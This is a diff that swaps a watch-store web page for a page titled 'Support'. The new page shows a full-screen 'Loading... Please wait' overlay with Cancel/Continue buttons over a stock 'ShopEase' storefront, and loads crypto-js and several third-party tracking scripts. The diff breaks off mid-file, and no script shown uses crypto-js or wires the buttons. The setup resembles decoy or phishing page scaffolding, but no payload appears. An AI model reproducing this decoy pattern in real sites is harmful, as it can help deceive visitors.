@@ -1,843 +1,312 @@
-<!doctype html>
-<html lang="zxx">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-	<!-- Meta -->
-	<meta charset="utf-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-	<meta name="description" content="An independent luxury horology archive and watch showcase documenting mechanical watch movements and strap calibrations.">
-	<!-- Page Title -->
-    <title>Wrist Vista Journal | Luxury Watch Store & Horology Archives</title>
-	<!-- Bootstrap Css -->
-	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-	<!-- Font Awesome Icon Css-->
-	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-	<!-- Main Custom Css -->
-	<link href="assets/style.css" rel="stylesheet">
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-      gtag('config', 'G-0LY0HY7L01');
-    </script>
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-
-    <!-- Topbar Section Start -->
-    <div class="topbar">
-        <div class="container">
-            <div class="row align-items-center">
-                <div class="col-lg-12 text-center">
-                    <!-- Topbar Content Information Start -->
-                    <div class="topbar-content-info">
-                        <p><i class="fa-regular fa-clock"></i> Get a Flat 10% Off on All Watches - Limited Time Only</p>
-                    </div>
-                    <!-- Topbar Content Information End -->
-                </div>
-            </div>
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
     </div>
-    <!-- Topbar Section End -->
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-    <!-- Header Start -->
-	<header class="main-header">
-		<div class="header-sticky">
-            <div class="container">
-                <nav class="navbar navbar-expand-lg p-0">
-                    <div class="header-action-box">
-                        <!-- Logo Start -->
-                        <a class="navbar-brand" href="index.php">
-                            Wrist Vista <span>Journal</span>
-                        </a>
-                        <!-- Logo End -->
-                        
-                        <!-- Header Search Form Box Start -->
-                        <div class="header-search-form-box d-none d-lg-block">
-                            <!-- Header Search Form Start -->
-                            <form class="header-search-form" onsubmit="return false;">
-                                <div class="header-Category-list">
-                                    <select name="service" class="form-select">
-                                        <option value="" disabled selected>All Categories</option>
-                                        <option value="sports_watches">Sports Watches</option>
-                                        <option value="Luxury_watches">Luxury Watches</option>
-                                        <option value="timeless_prestige">Timeless Prestige</option>
-                                    </select>
-                                </div>
-                                <div class="form-group">
-                                    <input type="text" placeholder="Search By Products..." required>
-                                    <button type="submit" class="header-search-btn"><i class="fa-solid fa-magnifying-glass"></i></button>
-                                </div>
-                            </form>
-                            <!-- Header Search Form End -->
-                        </div>
-                        <!-- Header Search Form Box End -->
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-                        <!-- Header Action Details Start -->
-                        <div class="header-action-details d-none d-lg-block">
-                            <ul>
-                                <li><a href="contact.html"><i class="fa-regular fa-user"></i> Account</a></li>
-                                <li><a href="contact.html"><i class="fa-regular fa-heart"></i> Wishlist</a></li>
-                                <li><a href="blog.html"><i class="fa-solid fa-basket-shopping"></i> Cart</a></li>
-                            </ul>
-                        </div>
-                        <!-- Header Action Details End -->
-                    </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
-                    <!-- Main Menu Start -->
-                    <div class="main-menu">
-                        <div class="nav-menu-wrapper">
-                            <ul>
-                                <li><a class="active" href="index.php">Home</a></li>                                
-                                <li><a href="about.html">Atelier Craft</a></li>
-                                <li><a href="blog.html">Watch Logs</a></li>
-                                <li><a href="contact.html">Curator Desk</a></li>
-                            </ul>
-                        </div>
-                        
-                        <!-- Header Contact Info Start -->
-                        <div class="header-contact-info d-none d-md-flex">
-                            <div class="icon-box">
-                                <i class="fa-solid fa-phone"></i>
-                            </div>
-                            <div class="header-contact-info-content">
-                                <p>Get Support</p>
-                                <span><a href="tel:+1-888-777-5845">+1-888-777-5845</a></span>
-                            </div>
-                        </div>
-                        <!-- Header Contact Info End -->
-                    </div>                
-                </nav>
-            </div>
-		</div>
-	</header>
-	<!-- Header End -->
-   
-    <!-- Hero Section Start -->
-    <div class="hero">
-        <div class="container">
-            <div class="row align-items-center">
-                <div class="col-lg-8">
-                    <!-- Section Title Start -->
-                    <div class="section-title">
-                        <span class="section-sub-title">A Legacy of Precision</span>
-                        <h1>Timeless elegance watch collection *</h1>
-                    </div>
-                    <!-- Section Title End -->
-                </div>
-
-                <div class="col-lg-4 text-start text-lg-end">
-                    <!-- Section Button Start -->
-                    <div class="section-btn mt-4 mt-lg-0">
-                        <a href="contact.html" class="btn-default btn-highlighted">Get Free Quote</a>
-                    </div>
-                    <!-- Section Button End -->
-                </div>
-            </div>
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-    </div>
-    <!-- Hero Section End -->
-
-    <!-- About Us Section Start -->
-    <div class="about-us">
-        <div class="container">
-            <div class="row align-items-center mb-5">
-                <div class="col-lg-6">
-                    <!-- Section Title Start -->
-                    <div class="section-title mb-lg-0">
-                        <span class="section-sub-title">About Us</span>
-                        <h2>Creating watches that blend innovation</h2>
-                    </div>
-                    <!-- Section Title End -->
-                </div>
-
-                <div class="col-lg-6">
-                    <!-- Section Title Content Start -->
-                    <div class="section-title-content">
-                        <p>We are committed to creating watches that seamlessly blend modern innovation with timeless craftsmanship. By combining advanced technology, premium materials, and thoughtful design, each timepiece is built to deliver precision, durability, and a refined aesthetic.</p>
-                    </div>
-                    <!-- Section Title Content End -->
-                </div>
-            </div>
-
-            <div class="row">
-                <div class="col-lg-12">
-                    <!-- About Us Items List Start -->
-                    <div class="about-us-items-list">
-                        <!-- About Us Item Start -->
-                        <div class="about-us-item">
-                            <h2>150+</h2>
-                            <h3>Limited Edition Releases</h3>
-                            <p>Our limited edition releases are crafted in small quantities to ensure uniqueness.</p>
-                        </div>
-                        <!-- About Us Item End -->
-
-                        <!-- About Us Item Start -->
-                        <div class="about-us-item">
-                            <h2>500+</h2>
-                            <h3>Premium Watch Designs</h3>
-                            <p>Our premium watch designs are crafted deliver a perfect balance of elegance.</p>
-                        </div>
-                        <!-- About Us Item End -->
-
-                        <!-- About Us Item Start -->
-                        <div class="about-us-item">
-                            <h2>4.9/5</h2>
-                            <h3>Average Customer Score</h3>
-                            <p>Our high average customer rating reflects the trust and satisfaction of our customers.</p>
-                        </div>
-                        <!-- About Us Item End -->
-                    </div>
-                    <!-- About Us Items List End -->
-
-                    <!-- About Category Items List Start -->
-                    <div class="about-category-items-list">
-                        <!-- About Category Item Start -->
-                        <div class="about-category-item">
-                            <!-- About Category Item Image Start -->
-                            <div class="about-category-item-image">
-                                <figure>
-                                    <img src="assets/img/about_him.jpg" alt="Watches For Him">
-                                </figure>
-                            </div>
-                            <!-- About Category Item Image End -->
-
-                            <!-- About Category Item Body Start -->
-                            <div class="about-category-item-body">
-                                <!-- About Category Item Content Start -->
-                                <div class="about-category-item-content">
-                                    <span>Watches</span>
-                                    <h2>For Him</h2>
-                                    <p>Discover Our New Watch Collection and Elevate Your Everyday Look.</p>
-                                </div>
-                                <!-- About Category Item Content End -->
-
-                                <!-- About Category Item Button Start -->
-                                <div class="about-category-item-btn">
-                                    <a href="blog.html" class="btn-default btn-highlighted">Shop Now</a>
-                                </div>
-                                <!-- About Category Item Button End -->
-                            </div>
-                            <!-- About Category Item Body End -->
-                        </div>
-                        <!-- About Category Item End -->
-
-                        <!-- About Category Item Start -->
-                        <div class="about-category-item">
-                            <!-- About Category Item Image Start -->
-                            <div class="about-category-item-image">
-                                <figure>
-                                    <img src="assets/img/about_her.jpg" alt="Watches For Her">
-                                </figure>
-                            </div>
-                            <!-- About Category Item Image End -->
-
-                            <!-- About Category Item Body Start -->
-                            <div class="about-category-item-body">
-                                <!-- About Category Item Content Start -->
-                                <div class="about-category-item-content">
-                                    <span>Watches</span>
-                                    <h2>For Her</h2>
-                                    <p>Discover Our New Watch Collection and Elevate Your Everyday Look.</p>
-                                </div>
-                                <!-- About Category Item Content End -->
-
-                                <!-- About Category Item Button Start -->
-                                <div class="about-category-item-btn">
-                                    <a href="blog.html" class="btn-default btn-highlighted">Shop Now</a>
-                                </div>
-                                <!-- About Category Item Button End -->
-                            </div>
-                            <!-- About Category Item Body End -->
-                        </div>
-                        <!-- About Category Item End -->
-                    </div>
-                    <!-- About Category Items List End -->
-                </div>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-    </div>
-    <!-- About Us Section End -->
-
-    <!-- Our Collection Section Start -->
-    <div class="our-collection">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-12">
-                    <!-- Section Title Start -->
-                    <div class="section-title-center">
-                        <span class="section-sub-title">Explore Our Collection</span>
-                        <h2>A perfect blend of innovation</h2>
-                        <p>Discover a collection of watches designed with precision and elegance. Each timepiece reflects our commitment to quality, offering a seamless combination.</p>
-                    </div>
-                    <!-- Section Title End -->
-                </div>
-            </div>
-
-            <div class="collection-grid">
-                <!-- Collection Item Start -->
-                <div class="collection-item">
-                    <!-- Collection Item Image Start -->
-                    <div class="collection-item-image">
-                        <a href="blog.html">
-                            <figure>
-                                <img src="assets/img/coll_1.jpg" alt="Sports Watches">
-                            </figure>
-                        </a>
-                    </div>
-                    <!-- Collection Item Image End -->
-
-                    <!-- Collection Item Body Start -->
-                    <div class="collection-item-body">
-                        <!-- Collection Item Content Start -->
-                        <div class="collection-item-content">
-                            <h2><a href="blog.html">Sports Watches</a></h2>
-                            <p>Discover Our New Watch Collection and Elevate Your Everyday Look.</p>
-                        </div>
-                        <!-- Collection Item Content End -->
-                        
-                        <!-- Collection Readmore Button Start-->
-                        <div class="collection-item-btn">
-                            <a href="blog.html" class="readmore-btn">Explore More</a>
-                        </div>
-                        <!-- Collection Readmore Button End-->
-                    </div>
-                    <!-- Collection Item Body End -->
-                </div>
-                <!-- Collection Item End -->
-
-                <!-- Collection Item Start -->
-                <div class="collection-item">
-                    <!-- Collection Item Image Start -->
-                    <div class="collection-item-image">
-                        <a href="blog.html">
-                            <figure>
-                                <img src="assets/img/coll_2.jpg" alt="Luxury Watches">
-                            </figure>
-                        </a>
-                    </div>
-                    <!-- Collection Item Image End -->
-
-                    <!-- Collection Item Body Start -->
-                    <div class="collection-item-body">
-                        <!-- Collection Item Content Start -->
-                        <div class="collection-item-content">
-                            <h2><a href="blog.html">Luxury Watches</a></h2>
-                            <p>Discover Our New Watch Collection and Elevate Your Everyday Look.</p>
-                        </div>
-                        <!-- Collection Item Content End -->
-                        
-                        <!-- Collection Readmore Button Start-->
-                        <div class="collection-item-btn">
-                            <a href="blog.html" class="readmore-btn">Explore More</a>
-                        </div>
-                        <!-- Collection Readmore Button End-->
-                    </div>
-                    <!-- Collection Item Body End -->
-                </div>
-                <!-- Collection Item End -->
-
-                <!-- Collection Item Start -->
-                <div class="collection-item">
-                    <!-- Collection Item Image Start -->
-                    <div class="collection-item-image">
-                        <a href="blog.html">
-                            <figure>
-                                <img src="assets/img/coll_3.jpg" alt="Chronograph Watches">
-                            </figure>
-                        </a>
-                    </div>
-                    <!-- Collection Item Image End -->
-
-                    <!-- Collection Item Body Start -->
-                    <div class="collection-item-body">
-                        <!-- Collection Item Content Start -->
-                        <div class="collection-item-content">
-                            <h2><a href="blog.html">Chronograph Watches</a></h2>
-                            <p>Discover Our New Watch Collection and Elevate Your Everyday Look.</p>
-                        </div>
-                        <!-- Collection Item Content End -->
-                        
-                        <!-- Collection Readmore Button Start-->
-                        <div class="collection-item-btn">
-                            <a href="blog.html" class="readmore-btn">Explore More</a>
-                        </div>
-                        <!-- Collection Readmore Button End-->
-                    </div>
-                    <!-- Collection Item Body End -->
-                </div>
-                <!-- Collection Item End -->
-            </div>
-
-            <div class="row">
-                <div class="col-lg-12">
-                    <!-- Section Footer Text Start -->
-		            <div class="section-footer-text section-satisfy-img">
-			            <!-- Satisfy Client Images Start -->
-                        <div class="satisfy-client-images">
-                            <div class="satisfy-client-image">
-                                <img src="assets/img/about_him.jpg" alt="Avatar">
-                            </div>
-                            <div class="satisfy-client-image add-more">
-                                <i class="fa-solid fa-phone"></i>
-                            </div>
-                        </div>
-			            <!-- Satisfy Client Images End -->    
-			            <p>Let's make something great work together. <a href="blog.html" style="color: var(--accent-color); font-weight: 700;">View our Collection</a></p>
-		            </div>
-		            <!-- Section Footer Text End -->
-                </div>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-    </div>
-    <!-- Our Collection Section End -->
-
-    <!-- Our Product Section Start -->
-    <div class="our-products">
-        <div class="container">
-            <div class="row align-items-center mb-5">
-                <div class="col-lg-6">
-                    <!-- Section Title Start -->
-                    <div class="section-title mb-lg-0">
-                        <span class="section-sub-title">Best Products</span>
-                        <h2>Timeless watches design for modern living</h2>
-                    </div>
-                    <!-- Section Title End -->
-                </div>
-
-                <div class="col-lg-6">
-                    <!-- Section Content Button Start -->
-                    <div class="section-content-btn">
-                        <p style="color: var(--text-color); margin-bottom: 20px;">Crafted with precision and elegance, our watches blend timeless design with modern functionality to complement every lifestyle.</p>
-                        <a href="blog.html" class="btn-default">View All Products</a>
-                    </div>   
-                    <!-- Section Content Button End -->
-                </div>
-            </div>
-
-            <div class="product-grid">
-                <!-- Product 1 -->
-                <div class="product-item">
-                    <div class="product-item-header">
-                        <div class="product-item-image">
-                            <a href="blog.html">
-                                <img src="assets/img/prod_1.jpg" alt="Classic Silver Dial Watch">
-                            </a>
-                        </div>
-                    </div>
-                    <div class="product-item-body">
-                        <div class="product-item-content">
-                            <p class="product-item-category">Premium Watch</p>
-                            <h2 class="product-item-title"><a href="blog.html">Classic Silver Dial Watch</a></h2>
-                            <div class="product-item-rating">
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <b>(4.9)</b>
-                            </div>
-                        </div>
-                        <div class="product-item-price">
-                            <h2>₹4,999.00</h2>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Product 2 -->
-                <div class="product-item">
-                    <div class="product-item-header">
-                        <div class="product-item-image">
-                            <a href="blog.html">
-                                <img src="assets/img/prod_2.jpg" alt="Black Chronograph Pro">
-                            </a>
-                        </div>
-                    </div>
-                    <div class="product-item-body">
-                        <div class="product-item-content">
-                            <p class="product-item-category">Premium Watch</p>
-                            <h2 class="product-item-title"><a href="blog.html">Black Chronograph Pro</a></h2>
-                            <div class="product-item-rating">
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <b>(4.9)</b>
-                            </div>
-                        </div>
-                        <div class="product-item-price">
-                            <h2>₹6,999.00</h2>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Product 3 -->
-                <div class="product-item">
-                    <div class="product-item-header">
-                        <div class="product-item-image">
-                            <a href="blog.html">
-                                <img src="assets/img/prod_3.jpg" alt="Automatic Skeleton Watch">
-                            </a>
-                        </div>
-                    </div>
-                    <div class="product-item-body">
-                        <div class="product-item-content">
-                            <p class="product-item-category">Premium Watch</p>
-                            <h2 class="product-item-title"><a href="blog.html">Automatic Skeleton Watch</a></h2>
-                            <div class="product-item-rating">
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <b>(4.9)</b>
-                            </div>
-                        </div>
-                        <div class="product-item-price">
-                            <h2>₹12,499.00</h2>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Product 4 -->
-                <div class="product-item">
-                    <div class="product-item-header">
-                        <div class="product-item-image">
-                            <a href="blog.html">
-                                <img src="assets/img/prod_4.jpg" alt="Aurex Royal Gold Edition">
-                            </a>
-                        </div>
-                    </div>
-                    <div class="product-item-body">
-                        <div class="product-item-content">
-                            <p class="product-item-category">Luxury Watch</p>
-                            <h2 class="product-item-title"><a href="blog.html">Aurex Royal Gold Edition</a></h2>
-                            <div class="product-item-rating">
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <b>(4.9)</b>
-                            </div>
-                        </div>
-                        <div class="product-item-price">
-                            <h2>₹15,499.00</h2>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Product 5 -->
-                <div class="product-item">
-                    <div class="product-item-header">
-                        <div class="product-item-image">
-                            <a href="blog.html">
-                                <img src="assets/img/prod_5.jpg" alt="Titan Smartwatch Pro">
-                            </a>
-                        </div>
-                    </div>
-                    <div class="product-item-body">
-                        <div class="product-item-content">
-                            <p class="product-item-category">Sports Watch</p>
-                            <h2 class="product-item-title"><a href="blog.html">Titan Smartwatch Pro</a></h2>
-                            <div class="product-item-rating">
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <b>(4.9)</b>
-                            </div>
-                        </div>
-                        <div class="product-item-price">
-                            <h2>₹6,000.00</h2>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Product 6 -->
-                <div class="product-item">
-                    <div class="product-item-header">
-                        <div class="product-item-image">
-                            <a href="blog.html">
-                                <img src="assets/img/prod_6.jpg" alt="ChronoX Ultra Smart">
-                            </a>
-                        </div>
-                    </div>
-                    <div class="product-item-body">
-                        <div class="product-item-content">
-                            <p class="product-item-category">Smartwatch</p>
-                            <h2 class="product-item-title"><a href="blog.html">ChronoX Ultra Smart</a></h2>
-                            <div class="product-item-rating">
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <i class="fa-solid fa-star"></i>
-                                <b>(4.9)</b>
-                            </div>
-                        </div>
-                        <div class="product-item-price">
-                            <h2>₹5,999.00</h2>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="row">
-                <div class="col-lg-12">
-                    <!-- Section Footer Text Start -->
-		            <div class="section-footer-text section-satisfy-img">
-			            <!-- Satisfy Client Images Start -->
-                        <div class="satisfy-client-images">
-                            <div class="satisfy-client-image">
-                                <img src="assets/img/about_her.jpg" alt="Avatar">
-                            </div>
-                            <div class="satisfy-client-image add-more">
-                                <i class="fa-solid fa-phone"></i>
-                            </div>
-                        </div>
-			            <!-- Satisfy Client Images End -->    
-			            <p>Let's make something great work together. <a href="contact.html" style="color: var(--accent-color); font-weight: 700;">Get Free Quote</a></p>
-		            </div>
-		            <!-- Section Footer Text End -->
-                </div>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-    </div>
-    <!-- Our Product Section End -->
-
-    
-    <!-- Our Brands Section Start -->
-    <div class="our-brands">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-12">
-                    <div class="section-title-center">
-                        <span class="section-sub-title">Shop By Brands</span>
-                        <h2>Trusted brand, timeless style</h2>
-                        <p>Each brand brings its own unique craftsmanship, ensuring you find a timepiece that perfectly matches your taste.</p>
-                    </div>
-                </div>
-            </div>
-
-            <div class="row-brands">
-                <div class="brand-item">
-                    <div class="brand-item-image">
-                        <figure><img src="assets/img/brand_1.jpg" alt="Aurex"></figure>
-                    </div>
-                    <div class="brand-item-logo">
-                        <h4>Aurex</h4>
-                    </div>
-                </div>
-                
-                <div class="brand-item">
-                    <div class="brand-item-image">
-                        <figure><img src="assets/img/brand_2.jpg" alt="ChronoX"></figure>
-                    </div>
-                    <div class="brand-item-logo">
-                        <h4>ChronoX</h4>
-                    </div>
-                </div>
-
-                <div class="brand-item">
-                    <div class="brand-item-image">
-                        <figure><img src="assets/img/brand_3.jpg" alt="Titan"></figure>
-                    </div>
-                    <div class="brand-item-logo">
-                        <h4>Titan</h4>
-                    </div>
-                </div>
-
-                <div class="brand-item">
-                    <div class="brand-item-image">
-                        <figure><img src="assets/img/brand_4.jpg" alt="Royal"></figure>
-                    </div>
-                    <div class="brand-item-logo">
-                        <h4>Royal</h4>
-                    </div>
-                </div>
-
-                <div class="brand-item">
-                    <div class="brand-item-image">
-                        <figure><img src="assets/img/brand_5.jpg" alt="Elite"></figure>
-                    </div>
-                    <div class="brand-item-logo">
-                        <h4>Elite</h4>
-                    </div>
-                </div>
-            </div>
-
-            <div class="row">
-                <div class="col-lg-12">
-                    <div class="section-footer-text text-center mt-4">
-                        <p><span>Free</span> Explore the World's Finest Watch Brands - <a href="blog.html" style="color: var(--accent-color); font-weight: 700;">Find Your Perfect Match Today</a></p>
-                    </div>
-                </div>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-    </div>
-    <!-- Our Brands Section End -->
-
-    <!-- New Arrivals Section Start -->
-    <div class="new-arrivals">
-        <div class="container">
-            <div class="row align-items-center mb-5">
-                <div class="col-lg-6">
-                    <div class="section-title mb-lg-0">
-                        <span class="section-sub-title">New Arrivals</span>
-                        <h2>Introducing new watches that redefine modern</h2>
-                    </div>
-                </div>
-
-                <div class="col-lg-6">
-                    <div class="section-content-btn">
-                        <p style="color: var(--text-color); margin-bottom: 20px;">Crafted with attention to detail, these watches are made to complement your style while offering lasting quality.</p>
-                        <a href="blog.html" class="btn-default">View All Arrivals</a>
-                    </div>
-                </div>
-            </div>
-
-            <div class="new-arrivals-grid">
